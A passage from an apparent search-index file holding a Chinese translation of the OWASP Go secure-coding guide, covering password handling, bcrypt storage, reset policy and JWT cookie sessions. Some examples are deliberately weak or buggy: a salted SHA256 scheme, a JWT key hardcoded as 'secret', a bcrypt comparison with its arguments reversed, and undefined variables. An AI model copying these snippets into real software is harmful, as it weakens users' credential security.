8c\u8bc1\u548c\u5bc6\u7801\u7ba1\u7406\u662f\u4efb\u4f55\u7cfb\u7edf\u7684\u5173\u952e\u90e8\u5206\uff0c\u4ece\u7528\u6237\u6ce8\u518c\u5230\u51ed\u8bc1\u5b58\u50a8\u3001\u5bc6\u7801\u91cd\u7f6e\u548c\u4e2a\u4eba\u8d44\u6e90\u8bbf\u95ee\u90fd\u6709\u8be6\u7ec6\u4ecb\u7ecd\u3002 \u4e3a\u4e86\u66f4\u6df1\u5165\u7684\u7ec6\u8282\uff0c\u53ef\u4ee5\u5bf9\u4e00\u4e9b\u6307\u5bfc\u539f\u5219\u8fdb\u884c\u5206\u7ec4\u3002\u8fd9\u91cc\u6e90\u4ee3\u7801\u793a\u4f8b\u6765\u8bf4\u660e\u3002","title":"\u8ba4\u8bc1\u4e0e\u5bc6\u7801\u7ba1\u7406"},{"location":"application-security/sdl/go-scp/#_14","text":"\u8ba9\u6211\u4eec\u4ece\u7ecf\u9a8c\u89c4\u5219\u5f00\u59cb\uff1a\"\u6240\u6709\u8eab\u4efd\u9a8c\u8bc1\u63a7\u5236\u90fd\u5fc5\u987b\u5728\u53d7\u4fe1\u4efb\u7684\u7cfb\u7edf\u4e0a\u5f3a\u5236\u6267\u884c\"\uff0c\u901a\u5e38\u662f\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u540e\u7aef\u7684\u670d\u52a1\u5668\u3002 \u4e3a\u4e86\u7cfb\u7edf\u7684\u7b80\u5355\u6027\u548c\u51cf\u5c11\u6545\u969c\u70b9\uff0c\u60a8\u5e94\u8be5\u4f7f\u7528\u6807\u51c6\u7684\u548c\u7ecf\u8fc7\u6d4b\u8bd5\u7684\u8ba4\u8bc1\u670d\u52a1\uff1a\u901a\u5e38\u6846\u67b6\u62e5\u6709\u8fd9\u6837\u7684\u6a21\u5757\uff0c\u5e76\u4e14\u6709\u8bb8\u591a\u4eba\u5f00\u53d1\u3001\u7ef4\u62a4\u548c\u4f7f\u7528\u5b83\u4eec\uff0c\u6211\u4eec\u9f13\u52b1\u60a8\u4f7f\u7528\u5b83\u4eec\u4f5c\u4e3a\u4e00\u79cd\u96c6\u4e2d\u7684\u8ba4\u8bc1\u673a\u5236\u3002\u4e0d\u8fc7\uff0c\u60a8\u5e94\u8be5\"\u4ed4\u7ec6\u68c0\u67e5\u4ee3\u7801\u4ee5\u786e\u4fdd\u5b83\u4e0d\u53d7\u4efb\u4f55\u6076\u610f\u4ee3\u7801\u7684\u5f71\u54cd\"\uff0c\u5e76\u786e\u4fdd\u5b83\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\u3002 \u8eab\u4efd\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u4e0d\u5e94\u8be5\u662f\u8d44\u6e90\u81ea\u8eab\u6765\u6267\u884c\u5b83,\u76f8\u53cd\uff0c\u5e94\u8be5\u4f7f\u7528\"\u4ece\u96c6\u4e2d\u5f0f\u8eab\u4efd\u9a8c\u8bc1\u63a7\u4ef6\u91cd\u5b9a\u5411\"\u3002\u5c0f\u5fc3\u5904\u7406\u91cd\u5b9a\u5411\uff1a\u60a8\u5e94\u8be5\u53ea\u91cd\u5b9a\u5411\u5230\u672c\u5730\u548c/\u6216\u5b89\u5168\u8d44\u6e90\u3002 \u5f53\u8ba4\u8bc1\u9700\u8981\"\u8fde\u63a5\u5230\u6d89\u53ca\u654f\u611f\u4fe1\u606f\u6216\u529f\u80fd\u7684\u5916\u90e8\u7cfb\u7edf\"\u65f6\uff0c\u5b83\u4e0d\u4ec5\u5e94\u8be5\u7531\u5e94\u7528\u7a0b\u5e8f\u7684\u7528\u6237\u4f7f\u7528\uff0c\u800c\u4e14\u8fd8\u5e94\u8be5\u7531\u60a8\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\"\u8bbf\u95ee\u5e94\u7528\u7a0b\u5e8f\u5916\u90e8\u670d\u52a1\u7684\u8eab\u4efd\u9a8c\u8bc1\u51ed\u636e\u5e94\u52a0\u5bc6\u5e76\u5b58\u50a8\u5728\u53d7\u4fe1\u4efb\u7cfb\u7edf\uff08\u5982\u670d\u52a1\u5668\uff09\u4e0a\u7684\u53d7\u4fdd\u62a4\u4f4d\u7f6e\u3002\u5b58\u50a8\u5728\u4ee3\u7801\u4e2d\u4e0d\u662f\u5b89\u5168\u7684\u4f4d\u7f6e\"\u3002","title":"\u7ecf\u9a8c\u89c4\u5219"},{"location":"application-security/sdl/go-scp/#_15","text":"\u5728\u672c\u8282\u4e2d\uff0c\"\u901a\u4fe1\"\u5728\u66f4\u5e7f\u6cdb\u7684\u610f\u4e49\u4e0a\u4f7f\u7528\uff0c\u5305\u62ec\u7528\u6237\u4f53\u9a8c\uff08UX\uff09\u548cCS\u901a\u4fe1\u3002 \u4e0d\u4ec5\"\u5bc6\u7801\u8f93\u5165\u5e94\u5728\u7528\u6237\u5c4f\u5e55\u4e0a\u9690\u85cf\"\uff0c\u800c\u4e14\"\u8bb0\u4f4f\u6211\"\u529f\u80fd\u5e94\u7981\u7528\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528\u8f93\u5165\u5b57\u6bb5type=\"password\"\u5e76\u5c06autocomplete\u5c5e\u6027\u8bbe\u7f6e\u4e3aoff\u6765\u5b8c\u6210\u8fd9\u4e24\u9879\u5de5\u4f5c\u3002 input type= password name= passwd autocomplete= off / \u8eab\u4efd\u9a8c\u8bc1\u51ed\u636e\u53ea\u80fd\u5728HTTP POST\u8bf7\u6c42\u4e0a\u4f7f\u7528\u52a0\u5bc6\u8fde\u63a5\uff08HTTPS\uff09\u53d1\u9001\u3002\u52a0\u5bc6\u8fde\u63a5\u7684\u4f8b\u5916\u53ef\u80fd\u662f\u7535\u5b50\u90ae\u4ef6\u91cd\u7f6e\u76f8\u5173\u8054\u7684\u4e34\u65f6\u5bc6\u7801\u3002 \u867d\u7136\u901a\u8fc7tls/ssl\uff08https\uff09\u7684HTTP GET\u8bf7\u6c42\u770b\u8d77\u6765\u548cHTTP POST\u8bf7\u6c42\u4e00\u6837\u5b89\u5168\uff0c\u4f46\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cHTTP\u670d\u52a1\u5668\uff08\u5982apache2\u3001nginx\uff09\u4f1a\u5c06\u8bf7\u6c42\u7684URL\u5199\u5165\u8bbf\u95ee\u65e5\u5fd7\u3002 xxx.xxx.xxx.xxx - - [27/Feb/2017:01:55:09 +0000] GET /?username=user password=70pS3cure/oassw0rd HTTP/1.1 200 235 - Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0 \u524d\u7aef\u4ee3\u7801\u5982\u4e0b\uff1a form method= post action= https://somedomain.com/user/signin autocomplete= off input type= hidden name= csrf value= CSRF-TOKEN / label Username input type= text name= username / /label label Password input type= password name= password / /label input type= submit value= Submit / /form \u5728\u5904\u7406\u8eab\u4efd\u9a8c\u8bc1\u9519\u8bef\u65f6\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e0d\u5e94\u516c\u5f00\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u7684\u54ea\u4e00\u90e8\u5206\u4e0d\u6b63\u786e\u3002\u4e0d\u8981\u4f7f\u7528\"\u65e0\u6548\u7528\u6237\u540d\"\u6216\"\u65e0\u6548\u5bc6\u7801\"\uff0c\u53ea\u9700\u4ea4\u66ff\u4f7f\u7528\"\u65e0\u6548\u7528\u6237\u540d\u548c/\u6216\u5bc6\u7801\"\uff1a form method= post action= https://somedomain.com/user/signin autocomplete= off input type= hidden name= csrf value= CSRF-TOKEN / div class= error p Invalid username and/or password /p /div label Username input type= text name= username / /label label Password input type= password name= password / /label input type= submit value= Submit / /form \u5bf9\u4e8e\u4e00\u822c\u6027\u4fe1\u606f\uff0c\u60a8\u4e0d\u62ab\u9732\uff1a \u6ce8\u518c\u4eba\uff1a\"\u65e0\u6548\u5bc6\u7801\"\u8868\u793a\u7528\u6237\u540d\u5b58\u5728\u3002 \u7cfb\u7edf\u7684\u5de5\u4f5c\u65b9\u5f0f\uff1a\"\u65e0\u6548\u5bc6\u7801\"\u53ef\u80fd\u4f1a\u663e\u793a\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u9996\u5148\u67e5\u8be2\u6570\u636e\u5e93\u4e2d\u7684\u7528\u6237\u540d\uff0c\u7136\u540e\u6bd4\u8f83\u5185\u5b58\u4e2d\u7684\u5bc6\u7801\u3002 \u9a8c\u8bc1\u548c\u5b58\u50a8\u90e8\u5206\u63d0\u4f9b\u4e86\u5982\u4f55\u6267\u884c\u9a8c\u8bc1\u6570\u636e\u9a8c\u8bc1\uff08\u548c\u5b58\u50a8\uff09\u7684\u793a\u4f8b\u3002 \u6210\u529f\u767b\u5f55\u540e\uff0c\u5e94\u901a\u77e5\u7528\u6237\u4e0a\u6b21\u6210\u529f\u6216\u4e0d\u6210\u529f\u7684\u8bbf\u95ee\u65e5\u671f/\u65f6\u95f4\uff0c\u4ee5\u4fbf\u7528\u6237\u80fd\u591f\u68c0\u6d4b\u548c\u62a5\u544a\u53ef\u7591\u6d3b\u52a8\u3002\u6709\u5173\u65e5\u5fd7\u8bb0\u5f55\u7684\u66f4\u591a\u4fe1\u606f\u53ef\u4ee5\u5728\u6587\u6863\u7684 \u9519\u8bef\u5904\u7406\u548c\u65e5\u5fd7\u8bb0\u5f55 \u4e2d\u627e\u5230\u3002\u6b64\u5916\uff0c\u4e3a\u4e86\u9632\u6b62\u653b\u51fb\uff0c\u5efa\u8bae\u5728\u68c0\u67e5\u5bc6\u7801\u65f6\u4f7f\u7528\u6052\u5b9a\u65f6\u95f4\u6bd4\u8f83\u529f\u80fd\uff0c\u5305\u62ec\u5206\u6790\u5177\u6709\u4e0d\u540c\u8f93\u5165\u7684\u591a\u4e2a\u8bf7\u6c42\u4e4b\u95f4\u7684\u65f6\u95f4\u5dee\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8868\u5355record==password\u6bd4\u8f83\u4e0d\u5339\u914d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5904\u5c06\u4f1a\u8fd4\u56defalse\uff0c\u63d0\u4ea4\u7684\u5bc6\u7801\u65f6\u95f4\u8d8a\u8fd1\uff0c\u54cd\u5e94\u65f6\u95f4\u8d8a\u957f\u3002\u901a\u8fc7\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u731c\u6d4b\u5bc6\u7801\u3002\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u8bb0\u5f55\u4e0d\u5b58\u5728\uff0c\u6211\u4eec\u4e5f\u603b\u662f\u5f3a\u5236\u6267\u884c\u5e26\u6709\u7a7a\u503c\u7684subtle.ConstantTimeCompare\u4ee5\u4fbf\u4e0e\u7528\u6237\u8f93\u5165\u8fdb\u884c\u6bd4\u8f83\u3002","title":"\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u901a\u4fe1"},{"location":"application-security/sdl/go-scp/#_16","text":"","title":"\u9a8c\u8bc1\u4e0e\u5b58\u50a8"},{"location":"application-security/sdl/go-scp/#_17","text":"\u672c\u8282\u7684\u5173\u952e\u4e3b\u9898\u662f\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5b58\u50a8\uff0c\u56e0\u4e3a\u7528\u6237\u5e10\u6237\u6570\u636e\u5e93\u7ecf\u5e38\u5728Internet\u4e0a\u6cc4\u6f0f\uff0c\u8fd9\u662f\u4e0d\u53ef\u53d6\u7684\u3002\u5f53\u7136\uff0c\u8fd9\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u53d1\u751f\uff0c\u4f46\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6b63\u786e\u5b58\u50a8\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\uff0c\u7279\u522b\u662f\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u907f\u514d\u9644\u5e26\u7684\u635f\u5bb3\u3002 \u9996\u5148\uff0c\u8ba9\u6211\u4eec\u660e\u786e\u201c\u6240\u6709\u8ba4\u8bc1\u63a7\u5236\u90fd\u5e94\u8be5\u5b89\u5168\u5931\u8d25\u201d\u3002\u5efa\u8bae\u60a8\u9605\u8bfb\u6240\u6709\u5176\u4ed6\u8eab\u4efd\u9a8c\u8bc1\u548c\u5bc6\u7801\u7ba1\u7406\u90e8\u5206\uff0c\u56e0\u4e3a\u5b83\u4eec\u5305\u62ec\u6709\u5173\u62a5\u544a\u9519\u8bef\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u548c\u5982\u4f55\u5904\u7406\u65e5\u5fd7\u8bb0\u5f55\u7684\u5efa\u8bae\u3002 \u53e6\u4e00\u4e2a\u521d\u6b65\u5efa\u8bae\u662f\uff1a\u5bf9\u4e8e\u987a\u5e8f\u8ba4\u8bc1\u7684\u5b9e\u73b0\uff08\u50cfGoogle\u73b0\u5728\u505a\u7684\u90a3\u6837\uff09\uff0c\u9a8c\u8bc1\u5e94\u8be5\u53ea\u5728\u6240\u6709\u6570\u636e\u8f93\u5165\u5b8c\u6210\u540e\uff0c\u5728\u53ef\u4fe1\u7cfb\u7edf\uff08\u5982\u670d\u52a1\u5668\uff09\u4e0a\u8fdb\u884c\u3002","title":"\u9a8c\u8bc1"},{"location":"application-security/sdl/go-scp/#_18","text":"package main import ( crypto/rand crypto/sha256 database/sql context fmt ) const saltSize = 32 func main() { ctx := context.Background() email := []byte( john.doe@somedomain.com ) password := []byte( 47;u5:B(95m72;Xq ) // create random word salt := make([]byte, saltSize) _, err := rand.Read(salt) if err != nil { panic(err) } // let's create SHA256(password+salt) hash := sha256.New() hash.Write(password) hash.Write(salt) // this is here just for demo purposes // // fmt.Printf( email : %s\\n , string(email)) // fmt.Printf( password: %s\\n , string(password)) // fmt.Printf( salt : %x\\n , salt) // fmt.Printf( hash : %x\\n , hash.Sum(nil)) // you're supposed to have a database connection stmt, err := db.PrepareContext(ctx, INSERT INTO accounts SET hash=?, salt=?, email=? ) if err != nil { panic(err) } result, err := stmt.ExecContext(ctx, email, h, salt) if err != nil { panic(err) } } \u7136\u800c\uff0c\u8fd9\u79cd\u65b9\u6cd5\u6709\u51e0\u4e2a\u7f3a\u9677\uff0c\u4e0d\u5e94\u8be5\u4f7f\u7528\u3002\u672c\u6587\u4ec5\u7528\u4e00\u4e2a\u5b9e\u4f8b\u6765\u8bf4\u660e\u8fd9\u4e00\u7406\u8bba\u3002\u4e0b\u4e00\u8282\u5c06\u89e3\u91ca\u5982\u4f55\u5728\u73b0\u5b9e\u751f\u6d3b\u4e2d\u6b63\u786e\u8bbe\u7f6e\u5bc6\u7801\u3002","title":"\u5b89\u5168\u5b58\u50a8\u5bc6\u7801\u7406\u8bba"},{"location":"application-security/sdl/go-scp/#_19","text":"\u4e0b\u9762\u7684\u793a\u4f8b\u6f14\u793a\u5982\u4f55\u4f7f\u7528bcrypt\uff0c\u8fd9\u5bf9\u4e8e\u5927\u591a\u6570\u60c5\u51b5\u90fd\u662f\u8db3\u591f\u597d\u7684\u3002BCRYPT\u7684\u4f18\u70b9\u662f\u4f7f\u7528\u8d77\u6765\u66f4\u7b80\u5355\uff0c\u56e0\u6b64\u4e0d\u6613\u51fa\u9519\u3002 package main import ( database/sql context fmt golang.org/x/crypto/bcrypt ) func main() { ctx := context.Background() email := []byte( john.doe@somedomain.com ) password := []byte( 47;u5:B(95m72;Xq ) // Hash the password with bcrypt hashedPassword, err := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost) if err != nil { panic(err) } // this is here just for demo purposes // // fmt.Printf( email : %s\\n , string(email)) // fmt.Printf( password : %s\\n , string(password)) // fmt.Printf( hashed password: %x\\n , hashedPassword) // you're supposed to have a database connection stmt, err := db.PrepareContext(ctx, INSERT INTO accounts SET hash=?, email=? ) if err != nil { panic(err) } result, err := stmt.ExecContext(ctx, hashedPassword, email) if err != nil { panic(err) } } bcrypt\u8fd8\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u800c\u5b89\u5168\u7684\u65b9\u6cd5\u6765\u6bd4\u8f83\u660e\u6587\u5bc6\u7801\u548c\u5df2\u7ecf\u6563\u5217\u7684\u5bc6\u7801\uff1a ctx := context.Background() // credentials to validate email := []byte( john.doe@somedomain.com ) password := []byte( 47;u5:B(95m72;Xq ) // fetch the hashed password corresponding to the provided email record := db.QueryRowContext(ctx, SELECT hash FROM accounts WHERE email = ? LIMIT 1 , email) var expectedPassword string if err := record.Scan( expectedPassword); err != nil { // user does not exist // this should be logged (see Error Handling and Logging) but execution // should continue } if bcrypt.CompareHashAndPassword(password, []byte(expectedPassword)) != nil { // passwords do not match // passwords mismatch should be logged (see Error Handling and Logging) // error should be returned so that a GENERIC message Sign-in attempt has // failed, please check your credentials can be shown to the user. }","title":"\u5b89\u5168\u5b58\u50a8\u5bc6\u7801\u5b9e\u8df5"},{"location":"application-security/sdl/go-scp/#_20","text":"\u5bc6\u7801\u662f\u4e00\u79cd\u5386\u53f2\u8d44\u4ea7\uff0c\u662f\u5927\u591a\u6570\u8ba4\u8bc1\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\uff0c\u4e5f\u662f\u653b\u51fb\u8005\u7684\u5934\u53f7\u76ee\u6807\u3002 \u5f88\u591a\u65f6\u5019\u4e00\u4e9b\u670d\u52a1\u4f1a\u6cc4\u9732\u7528\u6237\u7684\u4fe1\u606f\uff0c\u5c3d\u7ba1\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u548c\u5176\u4ed6\u4e2a\u4eba\u6570\u636e\u4e5f\u6cc4\u9732\u4e86\uff0c\u4f46\u6700\u5927\u7684\u95ee\u9898\u662f\u5bc6\u7801\u3002\u4e3a\u4ec0\u4e48\uff1f\u56e0\u4e3a\u5bc6\u7801\u4e0d\u5bb9\u6613\u7ba1\u7406\u548c\u8bb0\u5fc6\uff0c\u7528\u6237\u503e\u5411\u4e8e\u4f7f\u7528\u5f31\u5bc6\u7801\uff08\u4f8b\u5982\u201c123456\u201d\uff09\u4ed6\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u8bb0\u4f4f\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u670d\u52a1\u4e2d\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u7801\u3002 \u5982\u679c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u767b\u5f55\u9700\u8981\u5bc6\u7801\uff0c\u60a8\u53ef\u4ee5\u505a\u7684\u6700\u597d\u7684\u4e8b\u60c5\u662f\"\u5f3a\u5236\u6267\u884c\u5bc6\u7801\u590d\u6742\u6027\u8981\u6c42\uff0c\u8981\u6c42\u4f7f\u7528\u5b57\u6bcd\u4ee5\u53ca\u6570\u5b57\u548c/\u6216\u7279\u6b8a\u5b57\u7b26\"\u3002\u5bc6\u7801\u957f\u5ea6\u4e5f\u5e94\u8be5\u5f3a\u5236\u8981\u6c42\uff1a\"\u901a\u5e38\u4f7f\u75288\u4e2a\u5b57\u7b26\uff0c\u4f4616\u4e2a\u5b57\u7b26\u66f4\u597d\uff0c\u6216\u8005\u8003\u8651\u4f7f\u7528\u591a\u4e2a\u5355\u8bcd\u7684\u5bc6\u7801\u77ed\u8bed\"\u3002 \u5f53\u7136\uff0c\u524d\u9762\u7684\u6307\u5bfc\u539f\u5219\u90fd\u4e0d\u4f1a\u963b\u6b62\u7528\u6237\u91cd\u65b0\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u7801\u3002\u6700\u597d\u7684\u529e\u6cd5\u662f\"\u5f3a\u5236\u66f4\u6539\u5bc6\u7801\"\uff0c\u9632\u6b62\u5bc6\u7801\u91cd\u590d\u4f7f\u7528\u3002\u5173\u952e\u7cfb\u7edf\u53ef\u80fd\u9700\u8981\u66f4\u9891\u7e41\u7684\u66f4\u6539\uff0c\u5fc5\u987b\u5bf9\u91cd\u7f6e\u4e4b\u95f4\u7684\u65f6\u95f4\u8fdb\u884c\u7ba1\u7406\u63a7\u5236\u201d\u3002","title":"\u5bc6\u7801\u7b56\u7565"},{"location":"application-security/sdl/go-scp/#_21","text":"\u5373\u4f7f\u60a8\u6ca1\u6709\u5e94\u7528\u4efb\u4f55\u989d\u5916\u7684\u5bc6\u7801\u7b56\u7565\uff0c\u7528\u6237\u4ecd\u7136\u9700\u8981\u80fd\u591f\u91cd\u7f6e\u4ed6\u4eec\u7684\u5bc6\u7801\u3002\u8fd9\u79cd\u673a\u5236\u4e0e\u6ce8\u518c\u6216\u767b\u5f55\u4e00\u6837\u91cd\u8981\uff0c\u6211\u4eec\u9f13\u52b1\u60a8\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\uff0c\u786e\u4fdd\u60a8\u7684\u7cfb\u7edf\u4e0d\u4f1a\u6cc4\u9732\u654f\u611f\u6570\u636e\uff0c\u4e5f\u4e0d\u4f1a\u53d7\u5230\u5371\u5bb3\u3002 \"\u5bc6\u7801\u66f4\u6539\u65f6\u95f4\u4e0d\u80fd\u5c11\u4e8e1\u5929\"\u3002\u8fd9\u6837\u53ef\u4ee5\u9632\u6b62\u5bf9\u5bc6\u7801\u91cd\u590d\u4f7f\u7528\u7684\u653b\u51fb\u3002\u6bcf\u5f53\u4f7f\u7528\"\u57fa\u4e8e\u7535\u5b50\u90ae\u4ef6\u7684\u91cd\u7f6e\uff0c\u53ea\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u5230\u9884\u5148\u6ce8\u518c\u7684\u5730\u5740\u4e0e\u4e34\u65f6\u94fe\u63a5/\u5bc6\u7801\"\uff0c\u8fd9\u4e2a\u94fe\u63a5\u5e94\u8be5\u6709\u4e00\u4e2a\u5f88\u77ed\u7684\u5230\u671f\u65f6\u95f4\u3002 \u6bcf\u5f53\u8bf7\u6c42\u5bc6\u7801\u91cd\u7f6e\u65f6\u5e94\u901a\u77e5\u7528\u6237\u3002\u540c\u6837\u4e34\u65f6\u5bc6\u7801\u4e5f\u5e94\u8be5\u5728\u4e0b\u6b21\u4f7f\u7528\u65f6\u66f4\u6539\u3002 \u5bc6\u7801\u91cd\u7f6e\u7684\u4e00\u4e2a\u5e38\u89c1\u505a\u6cd5\u662f\"\u5b89\u5168\u95ee\u9898\"\uff0c\u5176\u7b54\u6848\u4ee5\u524d\u662f\u7531\u5e10\u6237\u6240\u6709\u8005\u914d\u7f6e\u7684\u3002\u5bc6\u7801\u91cd\u7f6e\u95ee\u9898\u5e94\u652f\u6301\u8db3\u591f\u7684\u968f\u673a\u7b54\u6848\uff1a\u8be2\u95ee\"\u6700\u559c\u7231\u7684\u4e66\"\uff1f\u53ef\u80fd\u7b54\u6848\u603b\u4f1a\u662f\"\u5723\u7ecf\"\uff0c\u8fd9\u4f7f\u5f97\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\u6210\u4e3a\u4e00\u4e2a\u574f\u95ee\u9898\u3002","title":"\u91cd\u7f6e"},{"location":"application-security/sdl/go-scp/#_22","text":"\u8eab\u4efd\u9a8c\u8bc1\u662f\u4efb\u4f55\u7cfb\u7edf\u7684\u5173\u952e\u90e8\u5206\uff0c\u56e0\u6b64\u60a8\u5e94\u8be5\u59cb\u7ec8\u91c7\u7528\u6b63\u786e\u548c\u5b89\u5168\u7684\u505a\u6cd5\u3002\u4ee5\u4e0b\u662f\u4f7f\u60a8\u7684\u8ba4\u8bc1\u7cfb\u7edf\u66f4\u5177\u5f39\u6027\u7684\u4e00\u4e9b\u6307\u5bfc\u539f\u5219\uff1a \u5728\u6267\u884c\u5173\u952e\u64cd\u4f5c\u4e4b\u524d\u91cd\u65b0\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\uff1b \u5bf9\u9ad8\u5ea6\u654f\u611f\u6216\u9ad8\u4ef7\u503c\u4ea4\u6613\u5e10\u6237\u4f7f\u7528\u591a\u56e0\u7d20\u8eab\u4efd\u9a8c\u8bc1\uff1b \u5229\u7528\u76f8\u540c\u7684\u5bc6\u7801\uff0c\u5b9e\u65bd\u76d1\u63a7\u4ee5\u8bc6\u522b\u9488\u5bf9\u591a\u4e2a\u7528\u6237\u5e10\u6237\u7684\u653b\u51fb\u3002\u5f53\u7528\u6237ID\u53ef\u4ee5\u88ab\u83b7\u53d6\u6216\u731c\u6d4b\u65f6\uff0c\u8fd9\u79cd\u653b\u51fb\u6a21\u5f0f\u7528\u4e8e\u7ed5\u8fc7\u6807\u51c6\u9501\u5b9a\uff1b \u66f4\u6539\u4f9b\u5e94\u5546\u63d0\u4f9b\u7684\u6240\u6709\u9ed8\u8ba4\u5bc6\u7801\u548c\u7528\u6237ID\u6216\u7981\u7528\u5173\u8054\u5e10\u6237\uff1b \u5728\u5df2\u786e\u5b9a\u7684\u65e0\u6548\u767b\u5f55\u5c1d\u8bd5\u6b21\u6570\uff08\u4f8b\u5982\uff1a\u4e94\u6b21\u5c1d\u8bd5\u662f\u5e38\u89c1\u7684\uff09\u540e\u5f3a\u5236\u7981\u7528\u5e10\u6237\u3002\u5fc5\u987b\u7981\u7528\u8be5\u5e10\u6237\u4e00\u6bb5\u65f6\u95f4\uff0c\u8fd9\u6bb5\u65f6\u95f4\u5fc5\u987b\u8db3\u4ee5\u963b\u6b62\u5bf9\u51ed\u636e\u7684\u91ce\u86ee\u731c\u6d4b\uff0c\u4f46\u4e0d\u80fd\u957f\u5230\u5141\u8bb8\u6267\u884c\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002","title":"\u5176\u5b83\u6307\u5357"},{"location":"application-security/sdl/go-scp/#session","text":"\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u6839\u636eOWASP\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u6765\u4ecb\u7ecd\u4f1a\u8bdd\u7ba1\u7406\u7684\u91cd\u8981\u5185\u5bb9\u3002\u63d0\u4f9b\u4e86\u4e00\u4e2a\u793a\u4f8b\u4ee5\u53ca\u5b9e\u8df5\u539f\u7406\u6982\u8ff0\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u5305\u542b\u5b8c\u6574\u7a0b\u5e8f\u4ee3\u7801\u7684\u6587\u4ef6\u5939\u3002\u4f1a\u8bdd\u8fdb\u7a0b\u5982\u56fe\u6240\u793a\uff1a \u5728\u5904\u7406\u4f1a\u8bdd\u7ba1\u7406\u65f6\uff0c\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u53ea\u8bc6\u522b\u670d\u52a1\u5668\u4e2d\u7684\u4f1a\u8bdd\u7ba1\u7406\u63a7\u4ef6\uff0c\u5e76\u5728\u5728\u53d7\u4fe1\u4efb\u7684\u7cfb\u7edf\u4e0a\u521b\u5efa\u4f1a\u8bdd\u3002\u5728\u63d0\u4f9b\u7684\u4ee3\u7801\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528JWT\u751f\u6210\u4e00\u4e2a\u4f1a\u8bdd\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a // create a JWT and put in the clients cookie func setToken(res http.ResponseWriter, req *http.Request) { ... } \u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u7528\u4e8e\u751f\u6210\u4f1a\u8bdd\u6807\u8bc6\u7b26\u7684\u7b97\u6cd5\u662f\u8db3\u591f\u968f\u673a\u7684\uff0c\u4ee5\u9632\u6b62\u4f1a\u8bdd\u88ab\u66b4\u529b\u7834\u89e3\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a ... token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) signedToken, _ := token.SignedString([]byte( secret )) //our secret ... \u65e2\u7136\u53c8\u4e86\u8db3\u591f\u5f3a\u7684\u4ee4\u724c\uff0c\u6211\u4eec\u5fc5\u987b\u7ed9cookie\u8bbe\u7f6e Domain \u3001 Path \u3001 Expires \u3001 HTTPOnly \u3001 Secure \u7b49\u53c2\u6570\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u628aExpires\u503c\u8bbe\u7f6e\u4e3a30\u5206\u949f\u4ee5\u6b64\u6765\u964d\u4f4e\u5e94\u7528\u7a0b\u5e8f\u98ce\u9669\u3002 // Our cookie parameter cookie := http.Cookie{ Name: Auth , Value: signedToken, Expires: expireCookie, HttpOnly: true, Path: / , Domain: 127.0.0.1 , Secure: true } http.SetCookie(res, cookie) //Set the cookie \u6bcf\u6b21\u6210\u529f\u767b\u5f55\u540e\u90fd\u4f1a\u751f\u6210\u65b0\u7684\u4f1a\u8bdd\uff0c\u5386\u53f2\u4f1a\u8bdd\u5c06\u4e0d\u4f1a\u88ab\u91cd\u65b0\u4f7f\u7528\uff0c\u5373\u4f7f\u5b83\u6ca1\u6709\u8fc7\u671f\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528Expire\u53c2\u6570\u5f3a\u5236\u5b9a\u671f\u7ec8\u6b62\u4f1a\u8bdd\uff0c\u4ee5\u9632\u6b62\u4f1a\u8bdd\u52ab\u6301\u3002Cookie\u7684\u53e6\u5916\u4e00\u4e2a\u91cd\u8981\u56e0\u7d20\u662f\u4e0d\u5141\u8bb8\u540c\u4e00\u7528\u6237\u540c\u65f6\u767b\u5f55\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4fdd\u5b58\u767b\u5f55\u7528\u6237\u5217\u8868\u5b8c\u6210\uff0c\u5c06\u65b0\u7684\u767b\u5f55\u7528\u6237\u540d\u4e0e\u5217\u8868\u8fdb\u884